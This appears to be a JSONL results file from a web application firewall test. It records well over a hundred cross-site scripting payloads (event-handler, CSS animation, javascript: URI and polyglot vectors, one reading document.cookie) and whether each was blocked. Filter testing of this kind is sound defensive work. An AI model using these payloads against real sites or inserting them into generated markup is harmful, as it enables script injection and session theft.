+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><body ondrop=alert(1) contenteditable>drop here</body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033943019952857867}
+{"payload": "<aside onmouseleave=\"alert(1)\">test</aside>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033264300000155345}
+{"payload": "<hr onkeyup=\"alert(1)\" contenteditable>test</hr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00344195899378974}
+{"payload": "<section draggable=\"true\" ondragend=\"alert(1)\">test</section>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003441308988840319}
+{"payload": "<style>:target {color:red;}</style><frameset id=x style=\"transition:color 1s\" ontransitionend=alert(1)></frameset>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00366316300642211}
+{"payload": "<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036944329913239926}
+{"payload": "<style>:target {color:red;}</style><samp id=x style=\"transition:color 1s\" ontransitionend=alert(1)></samp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035534950002329424}
+{"payload": "<x onmouseout=alert(1)>hover this!", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037235359923215583}
+{"payload": "<b onkeypress=\"alert(1)\" contenteditable>test</b>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005788226000731811}
+{"payload": "<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005244701998890378}
+{"payload": "<td onmouseout=\"alert(1)\">test</td>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003950455007725395}
+{"payload": "<applet onmousedown=\"alert(1)\">test</applet>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004358416001196019}
+{"payload": "<del onpaste=\"alert(1)\" contenteditable>test</del>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004176211994490586}
+{"payload": "<!--[if<img src=x onerror=alert(2)//]> -->//[\"'`-->]]>]</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037928590027149767}
+{"payload": "<listing onkeyup=\"alert(1)\" contenteditable>test</listing>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036578989966074005}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035556099901441485}
+{"payload": "<img srcset=validimage.png onload=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003391671009012498}
+{"payload": "<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003417130996240303}
+{"payload": "<code onmouseout=\"alert(1)\">test</code>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003285736995167099}
+{"payload": "<style>:target {color: red;}</style><label id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></label>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003921156996511854}
+{"payload": "<svg><thead onload=alert(1)></thead>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035071659949608147}
+{"payload": "<style>@keyframes x{}</style><noembed style=\"animation-name:x\" onanimationstart=\"alert(1)\"></noembed>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003478509999695234}
+{"payload": "<mark oncopy=\"alert(1)\" contenteditable>test</mark>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034508569951867685}
+{"payload": "<bgsound onkeypress=\"alert(1)\" contenteditable>test</bgsound>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00397196201083716}
+{"payload": "<a class=bar href=\"http://www.example.org\">www.example.org</a>", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.010436898010084406}
+{"payload": "<col onmousedown=\"alert(1)\">test</col>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004173106994130649}
+{"payload": "<i draggable=\"true\" ondragstart=\"alert(1)\">test</i>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003627218000474386}
+{"payload": "<style>:target {color:red;}</style><meter id=x style=\"transition:color 1s\" ontransitionend=alert(1)></meter>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003605374993639998}
+{"payload": "<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033130090014310554}
+{"payload": "<style>:target {color:red;}</style><tt id=x style=\"transition:color 1s\" ontransitionend=alert(1)></tt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003600548006943427}
+{"payload": "<style>@keyframes slidein {}</style><source style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></source>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003640734008513391}
+{"payload": "<canvas onmousemove=\"alert(1)\">test</canvas>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003605716992751695}
+{"payload": "<base onmouseout=\"alert(1)\">test</base>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003654079991974868}
+{"payload": "<menuitem onkeypress=\"alert(1)\" contenteditable>test</menuitem>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003459644998656586}
+{"payload": "<u onclick=\"alert(1)\">test</u>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004463578996364959}
+{"payload": "<button draggable=\"true\" ondragstart=\"alert(1)\">test</button>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004409282992128283}
+{"payload": "<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003574586007744074}
+{"payload": "<template draggable=\"true\" ondragstart=\"alert(1)\">test</template>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003662842995254323}
+{"payload": "<menu id=x tabindex=1 onbeforedeactivate=alert(1)></menu><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035990890028188005}
+{"payload": "<rp onbeforecopy=\"alert(1)\" contenteditable>test</rp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036103649908909574}
+{"payload": "<basefont onmouseout=\"alert(1)\">test</basefont>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034932689886773005}
+{"payload": "<script>alert(document.head.childNodes[3].text)</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032090080057969317}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></menuitem>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004401348996907473}
+{"payload": "<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004611434997059405}
+{"payload": "<style>:target {color:red;}</style><iframe id=x style=\"transition:color 1s\" ontransitionend=alert(1)></iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005072157000540756}
+{"payload": "<article onbeforecopy=\"alert(1)\" contenteditable>test</article>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003941988994483836}
+{"payload": "<multicol onbeforecopy=\"alert(1)\" contenteditable>test</multicol>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004056720994412899}
+{"payload": "<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003840682009467855}
+{"payload": "<svg><blockquote onload=alert(1)></blockquote>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003516043012496084}
+{"payload": "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034331620117882267}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><map id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></map>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004512182989856228}
+{"payload": "<command onkeypress=\"alert(1)\" contenteditable>test</command>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037279529933584854}
+{"payload": "<a onbeforepaste=\"alert(1)\" contenteditable>test</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004078083002241328}
+{"payload": "<article oncontextmenu=\"alert(1)\">test</article>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003761218991712667}
+{"payload": "<keygen onkeydown=\"alert(1)\" contenteditable>test</keygen>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003519027988659218}
+{"payload": "<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037299870018614456}
+{"payload": "<content id=x tabindex=1 onbeforedeactivate=alert(1)></content><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034488429955672473}
+{"payload": "<head onmousedown=\"alert(1)\">test</head>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035489570000208914}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.006101613005739637}
+{"payload": "<style>@keyframes slidein {}</style><header style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></header>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005127475000335835}
+{"payload": "<ruby onmouseup=\"alert(1)\">test</ruby>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005021952005336061}
+{"payload": "<dt onmousemove=\"alert(1)\">test</dt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004840919995331205}
+{"payload": "<kbd onkeydown=\"alert(1)\" contenteditable>test</kbd>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00369791999401059}
+{"payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></tt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004301300999941304}
+{"payload": "<strike onmouseover=\"alert(1)\">test</strike>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004354368007625453}
+{"payload": "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003623165001044981}
+{"payload": "<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003596839989768341}
+{"payload": "<dialog draggable=\"true\" ondragstart=\"alert(1)\">test</dialog>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003792154006077908}
+{"payload": "<body onbeforeprint=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035119160020258278}
+{"payload": "<video draggable=\"true\" ondragstart=\"alert(1)\">test</video>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003546853011357598}
+{"payload": "<audio onmouseenter=\"alert(1)\">test</audio>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003277459996752441}
+{"payload": "<style>:target {color: red;}</style><tbody id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></tbody>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003571640991140157}
+{"payload": "<menuitem onmouseout=\"alert(1)\">test</menuitem>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003804112013312988}
+{"payload": "<style>@keyframes x{}</style><plaintext style=\"animation-name:x\" onanimationend=\"alert(1)\"></plaintext>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004279302011127584}
+{"payload": "<strong draggable=\"true\" ondrag=\"alert(1)\">test</strong>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003942800001823343}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><tt ondrop=alert(1) contenteditable>drop here</tt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003770926996367052}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><bdo id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></bdo>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004084957006853074}
+{"payload": "<var onmousemove=\"alert(1)\">test</var>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036749010032508522}
+{"payload": "<math><brute href=javascript:alert(1)>click", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034325909946346655}
+{"payload": "<a onkeyup=\"alert(1)\" contenteditable>test</a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034537330066086724}
+{"payload": "<svg><acronym onload=alert(1)></acronym>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003564777987776324}
+{"payload": "<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003971084006479941}
+{"payload": "<track onmouseleave=\"alert(1)\">test</track>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004704164995928295}
+{"payload": "<data oncut=\"alert(1)\" contenteditable>test</data>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003738775005331263}
+{"payload": "<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036284909874666482}
+{"payload": "a=\"get\";", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036548469943227246}
+{"payload": "<style>@keyframes slidein {}</style><isindex style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></isindex>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038764560013078153}
+{"payload": "<section id=x tabindex=1 onfocusin=alert(1)></section>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003651405990240164}
+{"payload": "<abbr draggable=\"true\" ondragleave=\"alert(1)\">test</abbr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035355220024939626}
+{"payload": "<aside onbeforecopy=\"alert(1)\" contenteditable>test</aside>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035088579898001626}
+{"payload": "<A href=\"javascript%26colon;confirm()\">click", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035652280057547614}
+{"payload": "<iframe ondblclick=\"alert(1)\">test</iframe>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032835980091476813}
+{"payload": "<select onkeydown=\"alert(1)\" contenteditable>test</select>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034181389928562567}
+{"payload": "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003471621996141039}
+{"payload": "<input oncopy=alert(1) value=\"XSS\" autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033737119956640527}
+{"payload": "<style>:target {color: red;}</style><svg id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003961536000133492}
+{"payload": "<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038366750086424872}
+{"payload": "<b onmouseleave=\"alert(1)\">test</b>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.011725370000931434}
+{"payload": "<base draggable=\"true\" ondragend=\"alert(1)\">test</base>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004568663003738038}
+{"payload": "</html>//[\"'`-->]]>]</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036887879978166893}
+{"payload": "<q onkeypress=\"alert(1)\" contenteditable>test</q>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036335500044515356}
+{"payload": "<html onkeyup=\"alert(1)\" contenteditable>test</html>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003497607001918368}
+{"payload": "<style>@keyframes x{}</style><s style=\"animation-name:x\" onanimationend=\"alert(1)\"></s>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038321559986798093}
+{"payload": "<datalist draggable=\"true\" ondragleave=\"alert(1)\">test</datalist>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036132120003458112}
+{"payload": "<marquee draggable=\"true\" ondragleave=\"alert(1)\">test</marquee>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033229590044356883}
+{"payload": "<x onxxx%3D1", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034202069946331903}
+{"payload": "<link onmouseout=\"alert(1)\">test</link>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036882360000163317}
+{"payload": "<plaintext onbeforecopy=\"alert(1)\" contenteditable>test</plaintext>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004528796998783946}
+{"payload": "<link draggable=\"true\" ondragleave=\"alert(1)\">test</link>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005888129002414644}
+{"payload": "<mark onkeydown=\"alert(1)\" contenteditable>test</mark>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004973889997927472}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><pre id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></pre>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.005196539001190104}
+{"payload": "<svg onpaste=\"alert(1)\" contenteditable>test</svg>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004171893000602722}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><rt id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></rt>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037479129969142377}
+{"payload": "<div id=\"100\"><img[a][b]src=x[d]onerror[c]=[e]\"alert(100)\">//[\"'`-->]]>]</div><div id=\"101\"><a href=\"[a]java[b]script[c]:alert(101)\">XXX</a>//[\"'`-->]]>]</div><div id=\"102\"><img src=\"x` `<script>alert(102)</script>\"` `>//[\"'`-->]]>]</div><div id=\"103\"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//[\"'`-->]]>]</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004653116993722506}
+{"payload": "<nobr onmouseup=\"alert(1)\">test</nobr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035334960120962933}
+{"payload": "<area draggable=\"true\" ondragleave=\"alert(1)\">test</area>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036236909945728257}
+{"payload": "<summary draggable=\"true\" ondragstart=\"alert(1)\">test</summary>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035086790012428537}
+{"payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationend=\"alert(1)\"></a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035775229916907847}
+{"payload": "<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003726249997271225}
+{"payload": "<a id=\"x\"><rect fill=\"white\" width=\"1000\" height=\"1000\"/></a>", "attack_type": "XSS", "result": "passed", "status_code": 200, "elapsed": 0.011341547011397779}
+{"payload": "<dialog onbeforecopy=\"alert(1)\" contenteditable>test</dialog>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0038505359989358112}
+{"payload": "<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(87)\"><rect width=\"1000\" height=\"1000\" fill=\"white\"/></a>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003968424003687687}
+{"payload": "<li ondblclick=\"alert(1)\">test</li>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003745026988326572}
+{"payload": "<content draggable=\"true\" ondragleave=\"alert(1)\">test</content>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036471280036494136}
+{"payload": "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035089689918095246}
+{"payload": "<basefont draggable=\"true\" ondragstart=\"alert(1)\">test</basefont>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036051050119567662}
+{"payload": "<dir draggable=\"true\" ondragleave=\"alert(1)\">test</dir>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0032987010054057464}
+{"payload": "<ruby onmouseleave=\"alert(1)\">test</ruby>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003403294991585426}
+{"payload": "<style>@keyframes slidein {}</style><br style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></br>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036958220007363707}
+{"payload": "<image onmousemove=\"alert(1)\">test</image>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003464192006504163}
+{"payload": "<style>:target {color: red;}</style><data id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></data>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035485359985614195}
+{"payload": "<nobr onpaste=\"alert(1)\" contenteditable>test</nobr>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003479251012322493}
+{"payload": "<summary onkeydown=\"alert(1)\" contenteditable>test</summary>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003419536995352246}
+{"payload": "<rp onmousemove=\"alert(1)\">test</rp>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003794052012381144}
+{"payload": "'<script>window.onload=function(){document.forms[0].message.value='1';}</script>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003427481002290733}
+{"payload": "<br/><hr/>jAvascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037699649983551353}
+{"payload": "<strike draggable=\"true\" ondragstart=\"alert(1)\">test</strike>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034187050041509792}
+{"payload": "<div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div><div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div><div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div><div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div><div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div><div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div><div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div><div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div><div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div><div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.014259711999329738}
+{"payload": "<body onbeforecopy=\"alert(1)\" contenteditable>test</body>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003917249996447936}
+{"payload": "<plaintext onmousemove=\"alert(1)\">test</plaintext>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003683115995954722}
+{"payload": "<html ontouchend=alert(1)>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0034444940101820976}
+{"payload": "<style>:target {color:red;}</style><canvas id=x style=\"transition:color 1s\" ontransitionend=alert(1)></canvas>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0035141010012011975}
+{"payload": "<menu id=x tabindex=1 onactivate=alert(1)></menu>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003482868996798061}
+{"payload": "<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationend=\"alert(1)\"></bgsound>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.004494148990488611}
+{"payload": "<div draggable=\"true\" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003924613993149251}
+{"payload": "<svg><main onload=alert(1)></main>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003538628006936051}
+{"payload": "<form draggable=\"true\" ondragleave=\"alert(1)\">test</form>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003839450000668876}
+{"payload": "<main onpaste=\"alert(1)\" contenteditable>test</main>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0037850929948035628}
+{"payload": "<area ondblclick=\"alert(1)\">test</area>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0036555219994625077}
+{"payload": "<sub onkeypress=\"alert(1)\" contenteditable>test</sub>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033867129968712106}
+{"payload": "<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003417963001993485}
+{"payload": "<spacer onmouseenter=\"alert(1)\">test</spacer>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003792948991758749}
+{"payload": "<style>:target {transform: rotate(180deg);}</style><nextid id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></nextid>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.00361529499059543}
+{"payload": "<style>:target {color:red;}</style><center id=x style=\"transition:color 1s\" ontransitionend=alert(1)></center>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.003785414999583736}
+{"payload": "<ruby draggable=\"true\" ondragend=\"alert(1)\">test</ruby>", "attack_type": "XSS", "result": "blocked", "status_code": 403, "elapsed": 0.0033081319998018444}
